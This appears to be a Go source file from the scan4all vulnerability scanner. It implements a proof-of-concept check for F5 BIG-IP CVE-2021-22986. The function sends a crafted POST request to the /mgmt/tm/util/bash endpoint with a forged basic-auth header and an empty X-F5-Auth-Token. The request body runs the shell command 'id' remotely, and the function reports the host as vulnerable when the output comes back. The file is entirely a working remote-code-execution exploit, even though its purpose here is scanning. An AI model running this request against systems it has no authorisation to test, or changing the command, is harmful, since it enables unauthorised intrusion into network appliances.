package f5

import (
	"fmt"
	"github.com/hktalent/scan4all/lib/util"
)

func CVE_2021_22986(u string) bool {
	header := make(map[string]string)
	header["Authorization"] = "Basic YWRtaW46MQ=="
	header["Connection"] = "close"
	header["X-F5-Auth-Token"] = ""
	header["X-Forwarded-For"] = "localhost"
	header["Content-Type"] = "application/json"
	header["Referer"] = "localhost"
	data := "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
	if req, err := util.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "commandResult") {
			util.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2021_22986|--\"%s\"\n", u))
			return true
		}
	}
	return false
}
